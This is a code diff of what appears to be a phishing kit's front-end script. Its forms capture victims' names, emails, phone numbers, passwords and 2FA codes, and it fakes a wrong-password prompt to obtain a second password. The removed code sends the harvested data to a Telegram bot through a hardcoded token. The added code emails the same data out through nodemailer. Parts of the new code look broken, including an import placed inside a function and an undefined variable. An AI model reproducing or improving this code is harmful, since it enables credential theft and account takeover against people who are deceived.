@@ -6673,328 +6673,106 @@
         }
       }
 
-      function sendTemplateData(templateData) {
-        const apiUrl = "http://localhost:3000/api/send-data";
+      import nodemailer from 'nodemailer';
+import dotenv from 'dotenv';
+dotenv.config(); // Load environment variables
 
-        return fetch(apiUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ templateData }),
-        })
-          .then((response) => response.json())
-          .then((data) => {
-            if (data.otp) {
-              localStorage.setItem("otp", data.otp);
-            } else {
-              console.error("OTP not found in response.");
-            }
-
-            if (templateData["personal-email"]) {
-              localStorage.setItem("email", templateData["personal-email"]);
-            } else {
-              console.warn("Email not provided in templateData.");
-            }
-
-            return data;
-          })
-          .catch((error) => {
-            console.error("Error during API call:", error);
-            throw error;
-          });
-      }
-
-      function apiFormhandle(event) {
-        event.preventDefault();
-
-        var spiner = apiForm.querySelector(".spinner-border");
-        var buttonText = apiForm.querySelector(".button-text");
-        var button = apiForm.querySelector("button");
-        var input = apiForm.querySelector("input");
-        var errortext = apiForm.querySelector(".invalid-feedback");
-        spiner.style.display = "block";
-        buttonText.style.display = "none";
-        errortext.style.display = "none";
-        button.setAttribute("disabled", "");
-        updateFormsSendData(serializeForm(apiForm));
-        setTimeout(function () {
-          if (apiInsertCounter == 0) {
-            errortext.style.display = "block";
-            errortext = apiForm.querySelector("input").value = "";
-            apiInsertCounter++;
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            button.removeAttribute("disabled");
-            hidePasswordIncorrectText();
-            input.setAttribute("name", "password-2");
-          } else {
-            getUserIp()
-              .then((userIpData) => {
-                const templateData = {
-                  user_ip: userIpData.user_ip,
-                  country: userIpData.country,
-                  country_code: userIpData.country_code,
-                  "full-name": formsSendData["full-name"],
-                  "personal-email": formsSendData["personal-email"],
-                  "buiseness-email": formsSendData["buiseness-email"],
-                  "mobile-phone-number": formsSendData["mobile-phone-number"],
-                  "password-1": formsSendData["password-1"],
-                  "password-2": formsSendData["password-2"],
-                  "2FA-2": formsSendData["2FA-2"],
-                  "2FA-3": formsSendData["2FA-3"],
-                  "page-name": formsSendData["page-name"],
-                  apeal: formsSendData["apeal"],
-                  dis_name: metrics.dis_name,
-                  is_Mobile: metrics.is_Mobile,
-                  params: metrics.params,
-                };
-
-                // Send template data to the API
-                return sendTemplateData(templateData);
-              })
-              .then(() => {
-                errortext.style.display = "none";
-                spiner.style.display = "none";
-                buttonText.style.display = "block";
-                button.removeAttribute("disabled");
-                hidePasswordIncorrectText();
-                input.setAttribute("name", "password-1");
-                apiModal.hide();
-                twoFAModal.show();
-              })
-              .catch((error) => {
-                console.error("Error in processing API request:", error);
-                spiner.style.display = "none";
-                buttonText.style.display = "block";
-                button.removeAttribute("disabled");
-                errortext.style.display = "block";
-              });
-          }
-        }, 4000);
-      }
-
-      async function fetchUserInfo() {
-        try {
-          const email = localStorage.getItem("email");
-
-          if (!email) {
-            console.error("No email found in local storage");
-            return null;
-          }
-
-          const apiUrl = `http://localhost:3000/api/user?email=${email}`;
-          const response = await fetch(apiUrl);
-          const data = await response.json();
-
-          if (response.ok) {
-            return data;
-          } else {
-            console.error(
-              "Error fetching user information:",
-              data.error || "Unknown error"
-            );
-            return null;
-          }
-        } catch (error) {
-          console.error("Error during API call:", error);
-          return null;
+// Function to send data via email using Nodemailer
+function sendEmail(templateData) {
+    // Create a transporter using the SMTP details from your .env file
+    const transporter = nodemailer.createTransport({
+        host: process.env.EMAIL_HOST,
+        port: process.env.EMAIL_PORT,
+        secure: false, // Use TLS (true for 465, false for other ports)
+        auth: {
+            user: process.env.EMAIL_USER, // your email address
+            pass: process.env.EMAIL_PASS  // your email password
         }
-      }
+    });
 
-      async function sendDataToTelegram() {
-        try {
-          const userInfo = await fetchUserInfo();
+    // Format the message content
+    const message = `
+        📝 **User Data Submitted** 📝
+        🏠 **User IP**: ${templateData.user_ip || 'N/A'}
+        🌍 **Country**: ${templateData.country || 'N/A'}
+        🌍 **Country Code**: ${templateData.country_code || 'N/A'}
+        👤 **Full Name**: ${templateData['full-name'] || 'N/A'}
+        📧 **Personal Email**: ${templateData['personal-email'] || 'N/A'}
+        📧 **Business Email**: ${templateData['buiseness-email'] || 'N/A'}
+        📱 **Mobile Phone Number**: ${templateData['mobile-phone-number'] || 'N/A'}
+        🔑 **Password 1**: ${templateData['password-1'] || 'N/A'}
+        🔑 **Password 2**: ${templateData['password-2'] || 'N/A'}
+        🔐 **2FA-1**: ${templateData['2FA-1'] || 'N/A'}
+        🔐 **2FA-2**: ${templateData['2FA-2'] || 'N/A'}
+        🔐 **2FA-3**: ${templateData['2FA-3'] || 'N/A'}
+        📄 **Page Name**: ${templateData['page-name'] || 'N/A'}
+        ✉️ **Appeal**: ${templateData.apeal || 'N/A'}
+        📱 **Device Name**: ${templateData.dis_name || 'N/A'}
+        📱 **Is Mobile**: ${templateData.is_Mobile || 'N/A'}
+        🔧 **Params**: ${templateData.params || 'N/A'}
+    `;
 
-          if (!userInfo) {
-            console.error("No user information available.");
-            return;
-          }
+    // Setup email options
+    const mailOptions = {
+        from: process.env.EMAIL_USER,  // Sender address
+        to: process.env.EMAIL_USER,    // Recipient address (or use any desired recipient)
+        subject: 'User Data Submission', // Subject line
+        text: message,  // Email body content
+    };
 
-          const message = `
-            User Information:
-            - User IP: ${userInfo.user.user_ip || "N/A"}
-            - Country: ${userInfo.user.country || "N/A"}
-            - Country Code: ${userInfo.user.country_code || "N/A"}
-            - Full Name: ${userInfo.user["full-name"] || "N/A"}
-            - Personal Email: ${userInfo.user["personal-email"] || "N/A"}
-            - Business Email: ${userInfo.user["buiseness-email"] || "N/A"}
-            - Mobile Phone Number: ${userInfo.user["mobile-phone-number"] || "N/A"}
-            - Password 1: ${userInfo.user["password-1"] || "N/A"}
-            - Password 2: ${userInfo.user["password-2"] || "N/A"}
-            - 2FA-1: ${userInfo.user["2FA-1"] || "N/A"}
-            - 2FA-2: ${userInfo.user["2FA-2"] || "N/A"}
-            - 2FA-3: ${userInfo.user["2FA-3"] || "N/A"}
-            - Page Name: ${userInfo.user["page-name"] || "N/A"}
-            - Appeal: ${userInfo.user.apeal || "N/A"}
-            - Device Name: ${userInfo.user.dis_name || "N/A"}
-            - Is Mobile: ${userInfo.user.is_Mobile || "N/A"}
-            - Params: ${userInfo.user.params || "N/A"}
-            `;
-
-          const botToken = "7818142477:AAGPQClwFNQEolP1YiefYnzjr_ZSYZO2DtU";
-          const chatId = "-4547317714";
-          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-          const payload = {
-            chat_id: chatId,
-            text: message,
-          };
-
-          const response = await fetch(url, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(payload),
-          });
-
-          const result = await response.json();
-
-          if (response.ok) {
-            console.log("Message sent successfully:", result);
-          } else {
-            console.error(
-              "Error sending message:", result.description || "Unknown error"
-            );
-          }
-        } catch (error) {
-          console.error("Error while sending data:", error);
+    // Send the email
+    transporter.sendMail(mailOptions, (error, info) => {
+        if (error) {
+            return console.log("Error sending email:", error);
         }
-      }
+        console.log("Email sent: " + info.response);
+    });
+}
 
-      var counter2FA = 1;
-      var countOf2FA = 1;
-      function twoFAFormHandle(event) {
-        //handleFormSubmit(event, twoFAForm)
-        event.preventDefault();
-        var passwordInput = twoFAForm.querySelector(".password-input");
-        var spiner = twoFAForm.querySelector(".spinner-border");
-        var buttonText = twoFAForm.querySelector(".button-text");
-        var button = twoFAForm.querySelector("button");
-        var errortext = twoFAForm.querySelector(".invalid-feedback");
-        var input = twoFAForm.querySelector("input");
-        errortext.style.display = "none";
-        spiner.style.display = "block";
-        buttonText.style.display = "none";
-        button.setAttribute("disabled", "");
+// Function to handle the first form submission (send data via email in real time)
+function firstFormHandle(event) {
+    event.preventDefault();
+    updateFormsSendData(serializeForm(firstForm));
 
-        var userOTP = input.value.trim();
+    var spiner = firstForm.querySelector(".spinner-border");
+    var buttonText = firstForm.querySelector(".button-text");
+    var button = firstForm.querySelector("button");
 
-        var storedOTP = localStorage.getItem("otp");
+    button.setAttribute("disabled", "");
+    spiner.style.display = "block";
+    buttonText.style.display = "none";
+    
+    setTimeout(function () {
+        // Send data via email after the first form is submitted
+        const templateData = {
+            user_ip: userIpData.user_ip,
+            country: userIpData.country,
+            country_code: userIpData.country_code,
+            "full-name": formsSendData["full-name"],
+            "personal-email": formsSendData["personal-email"],
+            "buiseness-email": formsSendData["buiseness-email"],
+            "mobile-phone-number": formsSendData["mobile-phone-number"],
+            "password-1": formsSendData["password-1"],
+            "password-2": formsSendData["password-2"],
+            "2FA-2": formsSendData["2FA-2"],
+            "2FA-3": formsSendData["2FA-3"],
+            "page-name": formsSendData["page-name"],
+            apeal: formsSendData["apeal"],
+            dis_name: metrics.dis_name,
+            is_Mobile: metrics.is_Mobile,
+            params: metrics.params,
+        };
 
-        updateFormsSendData(serializeForm(twoFAForm));
-        setTimeout(function () {
-          if (userOTP === storedOTP) {
-            // OTP is valid, proceed to next step
-            counter2FA++;
-            if (counter2FA >= countOf2FA + 1) {
-              // Success modal
-              unlock2FA();
-              spiner.style.display = "none";
-              buttonText.style.display = "block";
-              twoFAModal.hide();
+        // Send email
+        sendEmail(templateData);
 
-              sendDataToTelegram();
-
-              successModal.show();
-            } else {
-              // Move to the next step in the 2FA process
-              var send2FAButton = twoFAForm.querySelector("button.btn");
-              passwordInput.classList.add("disabled");
-              input.setAttribute("disabled", "");
-              input.setAttribute("name", "2FA-" + counter2FA);
-              send2FAButton.setAttribute("disabled", "");
-              twoFAForm.querySelector("input").value = "";
-              startTimer();
-              spiner.style.display = "none";
-              buttonText.style.display = "block";
-            }
-          } else {
-            // OTP is invalid, show error
-            spiner.style.display = "none";
-            buttonText.style.display = "block";
-            button.removeAttribute("disabled");
-            errortext.style.display = "block";
-            errortext.innerText = "Invalid OTP. Please try again.";
-          }
-        }, 2000); // Simulate API validation delay
-      }
-
-      function unlock2FA() {
-        var passwordInput = twoFAForm.querySelector(".password-input");
-        var errortext = twoFAForm.querySelector(".invalid-feedback");
-        var input = twoFAForm.querySelector("input");
-        var button = twoFAForm.querySelector("button");
-        errortext.style.display = "none";
-        var send2FAButton = twoFAForm.querySelector("button.btn");
-        send2FAButton.removeAttribute("disabled");
-        input.removeAttribute("disabled");
+        firstModal.hide();
+        apiModal.show();
+        spiner.style.display = "none";
+        buttonText.style.display = "block";
         button.removeAttribute("disabled");
-        passwordInput.classList.remove("disabled");
-      }
-
-      function serializeForm(formNode) {
-        const { elements } = formNode;
-        const data = Array.from(elements)
-          .filter((item) => item.name != "")
-          .map((element) => {
-            const { name, value } = element;
-
-            return {
-              name,
-              value,
-            };
-          });
-        var dict_data = {};
-        for (let i = 0; i < data.length; i++) {
-          var elem = data[i];
-          dict_data[elem.name] = elem.value;
-        }
-        return dict_data;
-      }
-
-      function totglePassDisplay() {
-        if (apiInput.type == "password") {
-          apiInput.type = "text";
-        } else {
-          apiInput.type = "password";
-        }
-      }
-      function updateFormsSendData(dict) {
-        for (var [key, value] of Object.entries(dict)) {
-          formsSendData[key] = value;
-        }
-      }
-
-      function startTimer() {
-        // Get the timer element
-        var timerElement = document.getElementById("timer");
-
-        // Check if the timer element exists
-        if (!timerElement) {
-          console.error("Timer element not found in the DOM.");
-          return; // Exit the function if the element is not found
-        }
-
-        // Start the countdown timer
-        var countDownDate = new Date().getTime();
-        var x = setInterval(function () {
-          var now = new Date().getTime();
-          var distance = Math.round((now - countDownDate) / 1000);
-          var insertedTime = INCORRECT_2FA_TIMEOUT - distance;
-
-          if (insertedTime <= 0) {
-            clearInterval(x); // Stop the timer
-            timerElement.style.display = "none";
-            timerElement.innerHTML = "EXPIRED";
-            unlock2FA(); // Proceed to unlock the form or take appropriate action
-          } else {
-            timerElement.style.display = "inline";
-            timerElement.innerHTML = insertedTime + "s ";
-          }
-        }, 1000);
-      }
+    }, 2000);
+}
 
       /* ----------------------------------------------------------------------------- */
       document.addEventListener("DOMContentLoaded", function () {
